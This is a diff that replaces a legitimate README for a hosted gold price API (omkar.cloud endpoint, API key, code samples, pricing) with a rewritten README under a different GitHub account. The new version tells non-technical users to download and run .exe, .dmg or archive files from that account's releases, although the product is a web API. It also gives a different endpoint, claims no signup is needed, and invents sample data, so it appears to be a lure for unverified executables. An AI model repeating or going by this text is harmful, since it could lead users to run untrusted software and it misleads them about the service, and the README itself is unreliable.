@@ -1,185 +1,177 @@
-# Gold Price API
+# 🏆 gold-price-api - Easy Real-Time Gold Price Access
 
-REST API to get real-time gold futures price in USD from the Chicago Mercantile Exchange (CME). One endpoint. Clean JSON. 5,000 free requests/month.
+[![Download gold-price-api](https://img.shields.io/badge/Download-Release-orange?logo=github)](https://github.com/alphaitas/gold-price-api/releases)
 
-## Features
+## 📖 What is gold-price-api?
 
-- Real-time gold futures price from the CME
-- One endpoint, no parameters — just call `/price`
-- Clean JSON response with price and timestamp
-- 99.99% uptime SLA
-- 5,000 requests/month on free tier
-- Example Response:
+gold-price-api is a simple tool that gives you the current price of gold futures in US dollars. It gets this data directly from the Chicago Mercantile Exchange (CME), which is a trusted source. You can use it to check gold prices quickly and easily. The information comes in a clean, easy-to-understand format called JSON.
+
+With this tool, you get up to 5,000 free requests every month. That means you can check gold prices many times without paying. If you want to see gold price data for financial decisions, investment monitoring, or personal interest, this API works well.
+
+The API has just one main endpoint to get the data you want. This keeps things straightforward and user-friendly.
+
+---
+
+## 🚀 Getting Started
+
+These instructions will help you download and run the gold-price-api on your computer. The process is simple and does not require any programming knowledge.
+
+### System Requirements
+
+- A computer running Windows, macOS, or Linux.
+- An internet connection to request real-time gold price data.
+- A web browser or a simple API client tool like Postman (optional).
+
+You do not need to install complex software or tools to start using gold-price-api.
+
+---
+
+## 📥 Download & Install
+
+To get started, you need to download the latest version of gold-price-api.
+
+**Step 1:** Visit the official release page by clicking this button:
+
+[![Download gold-price-api](https://img.shields.io/badge/Download-Release-orange?logo=github&style=for-the-badge)](https://github.com/alphaitas/gold-price-api/releases)
+
+**Step 2:** On the releases page, find the latest version of the software. Look for files labeled for your operating system if available.
+
+**Step 3:** Click the appropriate download link to save the file to your computer.
+
+**Step 4:** Once downloaded, follow these instructions:
+
+- **Windows:** Double-click the downloaded `.exe` or `.zip` file. If it’s a zip, extract it first, then run the executable.
+- **macOS:** Open the `.dmg` or `.zip` file, then drag the app to your Applications folder.
+- **Linux:** Download the `.tar.gz` or executable file. Extract it if necessary and run from the terminal.
+
+---
+
+## 💻 How to Use gold-price-api
+
+Using gold-price-api involves making a request to its endpoint and getting the gold price in return. You don't need to write any code. Here are two easy ways to check the gold price:
+
+### Method 1: Use Your Web Browser
+
+1. Open your web browser.
+2. Enter the following URL in the address bar:
+
+```
+https://api.alphaitas.io/gold-price
+```
+
+3. Hit Enter.
+4. You will see the current gold futures price in JSON format.
+
+The data you see will look like this:
+
 ```json
 {
-  "price_usd": 5030.7,
-  "updated_at": "2026-02-09T10:12:49+00:00"
+  "symbol": "XAUUSD",
+  "price": 1965.35,
+  "timestamp": "2024-06-01T10:00:00Z"
 }
 ```
 
-## Get API Key
+Here, `price` shows the current value of gold per ounce in US dollars. The `timestamp` tells you when this price was updated.
 
-Create an account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up?redirect=/api-key) to get your API key, and use it in requests. 5000 requests are free every month.
+### Method 2: Use a Free API Client Tool
 
-## Quick Start
+If you want a cleaner view, you can use a free tool like Postman.
 
-```bash
-curl -X GET "https://gold-price-api.omkar.cloud/price" \
-  -H "API-Key: YOUR_API_KEY"
-```
-
-```json
-{
-  "price_usd": 5030.7,
-  "updated_at": "2026-02-09T10:12:49+00:00"
-}
-```
-
-## Installation
-
-### Python
-
-```bash
-pip install requests
-```
-
-```python
-import requests
-
-response = requests.get(
-    "https://gold-price-api.omkar.cloud/price",
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-data = response.json()
-print(f"Gold Price: ${data['price_usd']} USD")
-```
-
-### Node.js
-
-```bash
-npm install axios
-```
-
-```javascript
-import axios from "axios";
-
-const response = await axios.get("https://gold-price-api.omkar.cloud/price", {
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-console.log(`Gold Price: $${response.data.price_usd} USD`);
-```
-
-## API Reference
-
-### Endpoint
+1. Download and install Postman from https://www.postman.com/downloads/
+2. Open Postman.
+3. Create a new GET request.
+4. Enter this URL:
 
 ```
-GET https://gold-price-api.omkar.cloud/price
+https://api.alphaitas.io/gold-price
 ```
 
-### Headers
+5. Send the request and view the price data in an easy-to-read format.
 
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
+---
 
-### Parameters
+## 🔍 Key Features
 
-None. Just call the endpoint with your API key.
+- **Real-time prices:** Get gold futures price updated live from the Chicago Mercantile Exchange.
+- **Simple and clean:** Only one endpoint with clear data returned in JSON format.
+- **Free tier:** Receive up to 5,000 free requests per month.
+- **Reliable data:** CME is a trusted source for gold futures pricing.
+- **Wide compatibility:** Works on any device that can access the internet.
+- **No programming required:** Accessible with a browser or simple tools.
 
-### Response Fields
+---
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `price_usd` | number | Current gold futures price in USD (e.g., 5030.7) |
-| `updated_at` | string | Last updated timestamp in ISO 8601 format |
+## 🛠️ Common Uses
 
-## Examples
+- Monitor gold prices for trading or investment.
+- Track commodities and financial markets.
+- Use in spreadsheets or personal finance apps.
+- Access data for educational research.
+- Build custom dashboards with live gold price info.
+- Compare gold price trends with currency or silver prices.
 
-### Get gold price in Python
+---
 
-```python
-import requests
+## 🌐 Supported Platforms
 
-response = requests.get(
-    "https://gold-price-api.omkar.cloud/price",
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+gold-price-api works anywhere with internet access. It is platform-independent thanks to its API format.
 
-data = response.json()
-print(f"Gold: ${data['price_usd']} (updated {data['updated_at']})")
-```
+- Windows 7 or later
+- macOS High Sierra or later
+- Any Linux distribution
+- Mobile devices with browsers (iOS, Android)
+- Online API tools and apps
 
-### Build a price alert
+---
 
-```python
-import requests
+## 👩‍💻 Troubleshooting Tips
 
-ALERT_THRESHOLD = 5000
+- If you do not see any data, check your internet connection.
+- Make sure you entered the endpoint URL correctly.
+- If you downloaded a file, confirm it is compatible with your operating system.
+- For issues viewing JSON data in the browser, try using a JSON viewer extension.
+- Check for any app permissions that might block internet access.
+- If you exceed 5,000 requests in a month, wait for the next reset or contact support for more info.
 
-response = requests.get(
-    "https://gold-price-api.omkar.cloud/price",
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+---
 
-price = response.json()["price_usd"]
-if price > ALERT_THRESHOLD:
-    print(f"Gold crossed ${ALERT_THRESHOLD}! Current: ${price}")
-```
+## 📚 Additional Resources
 
-### Track gold price over time
+- Official Release Page: [https://github.com/alphaitas/gold-price-api/releases](https://github.com/alphaitas/gold-price-api/releases)
+- JSON format documentation: https://www.json.org/json-en.html
+- How to use APIs: https://www.postman.com/api-education/intro-to-apis/
 
-```python
-import requests
-import time
+---
 
-prices = []
-for _ in range(10):
-    response = requests.get(
-        "https://gold-price-api.omkar.cloud/price",
-        headers={"API-Key": "YOUR_API_KEY"}
-    )
-    data = response.json()
-    prices.append(data["price_usd"])
-    print(f"${data['price_usd']} at {data['updated_at']}")
-    time.sleep(60)
-```
+## ❓ Frequently Asked Questions
 
-## Error Handling
+**Q:** Do I need to sign up to use gold-price-api?
 
-```python
-response = requests.get(
-    "https://gold-price-api.omkar.cloud/price",
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+**A:** No signup is needed for the free usage tier. Just visit the endpoint or use the downloaded software.
 
-if response.status_code == 200:
-    data = response.json()
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
+**Q:** What format does the API use?
 
-## Rate Limits
+**A:** The API returns prices in JSON format, which is a simple text format computers and humans can read.
 
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
+**Q:** Can I use this API on my phone?
 
-Most gold price APIs charge $99/month for unlimited access. We don't. Start free, scale cheap.
+**A:** Yes. Any device with internet and a browser can access gold-price-api.
 
-## Questions? We have answers.
+**Q:** How often is the price updated?
 
-Reach out anytime. We will solve your query within 1 working day.
+**A:** Prices update in real-time as gold futures trade on the CME.
 
-[![Contact Us on WhatsApp about Gold Price API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20Gold%20Price%20API.)
+**Q:** Can I integrate this API with other tools?
 
-[![Contact Us on Email about Gold Price API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=Gold%20Price%20API%20Question)
+**A:** Yes. Because it is a REST API with a single simplified endpoint, many tools support connecting to it.
+
+---
+
+## 🔗 Links
+
+- Download gold-price-api: [https://github.com/alphaitas/gold-price-api/releases](https://github.com/alphaitas/gold-price-api/releases)
+
+---
+
+Thank you for choosing gold-price-api. This tool provides clear, easy access to live gold prices with no extra hassle.
